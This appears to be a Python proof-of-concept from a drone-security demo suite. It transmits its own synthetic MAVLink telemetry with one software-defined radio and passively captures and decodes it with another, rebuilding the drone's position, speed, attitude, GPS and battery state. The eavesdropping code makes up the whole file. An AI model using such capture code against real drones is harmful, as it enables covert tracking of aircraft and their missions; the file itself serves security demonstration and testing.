#!/usr/bin/env python3
"""PoC 02 - Telemetry eavesdropping OVER-THE-AIR (PWNUAV IA-01, PA-01, IM-04).

Passive capture of the cleartext downlink, reconstructing the 'flight picture':
position, velocity, attitude, GPS, battery. Without any key. Drone=Pluto TX, attacker=RTL RX.
ONLY in a cage. venv: .venv-radio
"""
from __future__ import annotations
import os
os.environ.setdefault("MAVLINK20", "1")  # emit MAVLink 2 (0xFD)
import threading, collections, math
from pymavlink import mavutil
from pwnuav.rf import hw
from pwnuav import demo

def main():
    mav = mavutil.mavlink.MAVLink(None, srcSystem=1, srcComponent=1)
    msgs = demo.telemetry_messages(mav)
    buf, frame_len = demo.downlink_iq(msgs, mav, reps=20)

    print(demo.rule("PWNUAV EAVESDROP — cleartext telemetry"))
    print("[*] SDR RX: RTL-SDR @ 915 MHz  ;  victim: Pluto TX MAVLink (no crypto)")
    print("[IA-01] Passive capture 2.5 s — 0 keys, 0 handshakes required ...")
    def tx():
        d, st = hw.open_tx("plutosdr"); hw.transmit(d, st, buf, 3.0); hw.close(d, st)
    rxd, rxst = hw.open_rx("rtlsdr")
    t = threading.Thread(target=tx, daemon=True); t.start()
    s = hw.capture(rxd, rxst, 2.5); hw.close(rxd, rxst); t.join(timeout=3)
    frames = hw.decode_messages(s, frame_len)

    brk = collections.Counter(m.get_type() for m in frames)
    print(f"[*] {len(frames)} frames recovered from {len(s):,} IQ samples\n")
    print("[PA-01] MESSAGE BREAKDOWN")
    for name, c in sorted(brk.items()):
        print(f"  {name:<24} x{c}")
    print()

    last = {}
    for m in frames:
        last[m.get_type()] = m
    print("[IM-04] RECONSTRUCTED FLIGHT PICTURE  (all in the clear)")
    g = last.get("GLOBAL_POSITION_INT")
    if g:
        print(f"  Position : lat {g.lat/1e7:.6f}  lon {g.lon/1e7:.6f}  alt {g.alt/1000:.1f} m  (rel {g.relative_alt/1000:.1f} m)")
        spd = math.hypot(g.vx, g.vy)/100.0
        print(f"  Velocity : vx {g.vx/100:.2f}  vy {g.vy/100:.2f}  vz {g.vz/100:.2f} m/s  ground {spd:.2f} m/s  hdg {g.hdg/100:.1f} deg")
    gr = last.get("GPS_RAW_INT")
    if gr:
        print(f"  GPS      : fix {gr.fix_type} ({demo.enum_name('GPS_FIX_TYPE', gr.fix_type)})  sats {gr.satellites_visible}  eph {gr.eph/100:.2f}")
    a = last.get("ATTITUDE")
    if a:
        print(f"  Attitude : roll {math.degrees(a.roll):.1f}  pitch {math.degrees(a.pitch):.1f}  yaw {math.degrees(a.yaw):.1f} deg")
    v = last.get("VFR_HUD")
    if v:
        print(f"  VFR HUD  : airspeed {v.airspeed:.1f}  groundspeed {v.groundspeed:.1f} m/s  throttle {v.throttle}%  climb {v.climb:.1f} m/s")
    ss = last.get("SYS_STATUS")
    if ss:
        print(f"  Battery  : {ss.voltage_battery/1000:.1f} V  {ss.current_battery/100:.1f} A  {ss.battery_remaining}%")
    hb = last.get("HEARTBEAT")
    if hb:
        print(f"  Mode     : custom_mode {hb.custom_mode}  status {demo.enum_name('MAV_STATE', hb.system_status)}")
    print()
    if g:
        print("[*] SAMPLE GLOBAL_POSITION_INT — raw frame captured off the air")
        print(demo.hexdump(g.pack(mav)))
        print()
    ok = bool(g or ss or a)
    print("[+] FULL MISSION TELEMETRY EXFILTRATED — no credential, no key." if ok else "[-] no telemetry")
    return 0 if ok else 1

if __name__ == "__main__":
    raise SystemExit(main())
